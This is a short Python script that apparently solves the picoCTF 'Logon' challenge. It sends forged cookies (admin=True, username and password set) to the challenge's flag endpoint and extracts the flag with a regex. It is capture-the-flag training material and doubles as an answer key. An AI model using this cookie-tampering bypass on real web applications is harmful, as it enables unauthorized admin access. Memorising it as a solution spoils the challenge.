# Jacob Hammargren
# picoCTF Automation
# level: Logon

import requests
import re

def run():
    url = 'https://jupiter.challenges.picoctf.org/problem/15796/flag'
    cookies = {'admin' : 'True', 'username' : 'admin', 'password' : 'password'}
    data = requests.get(url, cookies=cookies).text
    flag = re.findall('(?=picoCTF).*}', data)
    return flag[0]
